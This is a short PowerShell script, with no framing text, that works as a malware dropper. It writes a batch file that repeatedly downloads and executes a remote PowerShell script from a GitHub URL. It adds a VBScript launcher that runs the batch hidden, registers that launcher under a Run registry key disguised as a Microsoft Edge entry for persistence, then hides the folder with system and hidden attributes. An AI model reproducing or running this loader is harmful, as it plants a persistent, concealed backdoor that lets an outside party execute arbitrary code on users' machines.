md C:\Intel\Profiles/IE/IEX; $contentToAdd = @"
:a
powershell IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/alejq41/free/main/powercod1.ps1').GetResponse().GetResponseStream()).ReadToEnd());
timeout /t 30
goto a
"@; add-content "C:\Intel\Profiles/IE/IEX/MSDLSIM.bat" $contenttoadd; $contentToAdd = @"
WScript.Sleep 10000
set objshell = createobject("wscript.shell")
objshell.run "C:\Intel\Profiles/IE/IEX\MSDLSIM.bat",vbhide
"@; add-content "C:\Intel\Profiles/IE/IEX/MSDLSIM.vbs" $contenttoadd; REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Microsoft_Edge_Company /d C:\Intel\Profiles\IE\IEX\MSDLSIM.vbs; cd C:\Intel\Profiles\IE\IEX; ./MSDLSIM.vbs
cd C:\
attrib +s +r +h +a intel
exit
